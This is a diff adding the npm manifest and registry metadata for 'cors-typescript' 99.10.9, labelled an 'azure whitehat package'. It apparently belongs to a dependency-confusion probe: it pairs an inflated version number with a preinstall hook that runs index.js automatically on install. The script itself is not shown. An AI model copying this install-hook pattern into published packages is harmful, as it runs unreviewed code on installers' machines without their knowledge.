@@ -1,0 +1,39 @@
+{
+    "name": "cors-typescript",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "cors-typescript@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-6g3d0QZqP99KbIFasEbN/1vdK5U9jgLPInERGXEIyBeyRlDPIwnt21Rxou49jaCVtE2L8fHE8dqnmPMICIlPiA==",
+        "shasum": "65085000d96d8903566682a23dff442beb897106",
+        "tarball": "https://registry.npmjs.org/cors-typescript/-/cors-typescript-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3579,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhooKMCRA9TVsSAnZWagAAs1QP/0u2qnejmxltkQ9y/qi1\nRdXtC7z0PUjcaVRpZko+l+qcP0iymCXOJUP4sbnwoPC0VdchgauyxJ8gJA78\nx0YQYN/jrHyQIUv1ihAYV/GQ52HKBQANB8yst2j1GwDENV1jqSVxh828lEMR\nBHXFlcQ2mUE5tI9f2fcCui0RAJAAVr/bB0EKjxRIkKl5S59KfDBBqTYp6X52\nIukp92LmktbCjzEk+tNkYkycTAVACu3wAg1+ud/Mh7FQIP43sASTaQMwRQG5\nmijOouSxoDGqPS8l+9+teHFCl942yAE106yMwzD+YXsLTUwrjnLe0crcqiN7\n/pGqUUH0MT5c/KtoTxcmhLp90R92b9pCgiscypVZ/rfSD85ComOyTQA5feD/\n4tJP0ZwI+m3TEC5iaF2/HBTtI8H7uTDzjlzegHUhmPnjiXoFEP92UDsR3CP/\n/IqLSuksTgPYbf3obf6/HNcCgBzd73aLh6D4fzCNYV6NW6OlfHTPWkG/Squr\no4JEut+wi3WQRNEz6cSy9P4Zipf3aLcSFxMB9QS0u9X5KqO/n1pkmgTochVi\nBKy2jl0s3hskPBfhS+9DTZPf/Oiy1PqG+n7px5+akJEcgCpB3LyWtXWi3v9A\nJ3sgYSghjA3CGBO5JYwAmlKmTICn5bcMzWjA8+Tj5PcAML7Y/r+imCXPn1Q6\nF2tM\r\n=qhaB\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/cors-typescript_99.10.9_1638040204529_0.2668664033827459"
+    },
+    "_hasShrinkwrap": false
+}
